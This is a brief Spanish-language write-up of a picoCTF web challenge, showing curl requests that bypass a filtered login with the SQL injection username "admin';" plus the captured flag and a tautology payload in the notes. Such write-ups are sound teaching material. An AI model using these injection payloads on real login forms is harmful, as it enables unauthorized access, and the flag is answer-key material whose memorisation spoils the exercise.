## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649
## Pistas
The password is being filtered.
## Solucion
```
picoCTF{m0R3_SQL_plz_aee925db}
```
## otra solucion
```
┌──(hectorr㉿kali2024)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin&password=password&debug=1"
<pre>username: admin
password: password
SQL query: SELECT * FROM users WHERE name='admin' AND password='password'
</pre><h1>Login failed.</h1>                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin';&password=password&debug=1"
<pre>username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';' AND password='password'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_aee925db}</p>                                                                                             
┌──(hectorr㉿kali2024)-[~]
└─$ 

```
## Notas adicionales 
username: admin
password: ' or 1= =1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1= =1;'
-nomas en el nombre pongo admin'; para que la comilla cierre y nos de acceso
## Referencias 